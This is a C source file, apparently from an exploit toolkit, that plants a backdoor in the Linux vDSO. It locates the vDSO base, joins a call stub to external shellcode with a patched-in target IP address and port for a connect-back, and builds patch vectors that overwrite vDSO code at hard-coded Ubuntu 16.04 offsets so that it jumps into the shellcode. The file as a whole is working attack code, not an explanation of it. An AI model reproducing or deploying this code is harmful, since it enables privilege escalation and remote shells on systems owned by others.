//
// Created by explorer on 2022/12/9.
//

#include "vdso_backdoor.h"
#include <stdlib.h>
#include <sys/auxv.h>
#include <string.h>
#include "unit.h"
// parse vdso and return vdso patch vector

// hard code vdso size
#define VDSO_SIZE 0x2000

void *get_vdso_base() {
    return (void *) getauxval(AT_SYSINFO_EHDR);
}

unsigned int get_backdoor_shellcode(unsigned char **shellcode_p, unsigned int *code_size) {
    extern unsigned char shellcode[];
    extern unsigned int shellcode_size;
    if (code_size) {
        *code_size = shellcode_size;
    }
    if (shellcode_p) {
        *shellcode_p = shellcode;
    }
    return shellcode_size;
}

unsigned int build_shellcode(unsigned char **shellcode_p, unsigned int *shellcode_size_p, unsigned int target_ip,
                             unsigned short target_port) {
    unsigned char *shellcode;
    unsigned int shellcode_size;
    static unsigned char call_shellcode_payload[] = {0x57, 0x56, 0x68, 0x63, 0x63, 0x63, 0x63, 0x5f, 0x68, 0x62, 0x62,
                                                     0x00, 0x00,
                                                     0x5e, 0xe8, 0x0d, 0x00, 0x00, 0x00, 0x5e, 0x5f, 0x58, 0x55, 0x48,
                                                     0x89, 0xe5,
                                                     0x41, 0x56, 0x41, 0x55, 0xff, 0xe0};

    get_backdoor_shellcode(&shellcode, &shellcode_size);

    unsigned char *new_shellcode = malloc(shellcode_size + sizeof(call_shellcode_payload));

    memcpy(new_shellcode, call_shellcode_payload, sizeof(call_shellcode_payload));
    memcpy(new_shellcode + sizeof(call_shellcode_payload), shellcode, shellcode_size);
    *(unsigned int *) (new_shellcode + 1+2) = target_ip;
    *(unsigned short *) (new_shellcode + 7+2) = target_port;

    if (shellcode_size_p) {
        *shellcode_size_p = shellcode_size + sizeof(call_shellcode_payload);
    }

    if (shellcode_p) {
        *shellcode_p = new_shellcode;
    }

    return shellcode_size;

}


// It's hard for support every vdos
// for now, hard code one for ubuntu:16.04
unsigned int
get_vdso_patch_vec(struct mem_vec **vecs_p, unsigned int *size, unsigned char *shellcode, unsigned int shellcode_size) {
    unsigned char *base_addr = (char *) get_vdso_base();

    static char payload_buf[8];

    if (vecs_p) {
        struct mem_vec *vecs = malloc(sizeof(struct mem_vec) * 2);
        *vecs_p = vecs;
        vecs[0].address = base_addr + VDSO_SIZE - shellcode_size - 16; // TODO:!!!
        vecs[0].data = shellcode;
        vecs[0].size = shellcode_size;

        char *p = payload_buf;
        p[0] = '\xe8';
        *(uint32_t *) (p + 1) = VDSO_SIZE - shellcode_size - 0xab0 - 5 - 16;
        p[5] = '\x90';
        p[6] = '\x90';
        p[7] = '\x90';
        vecs[1].address = base_addr + 0xab0;
        vecs[1].size = 8; // TODO: fuck align
        vecs[1].data = payload_buf;
    }
    if (size) {
        *size = 2;
    }
    return 2;
}

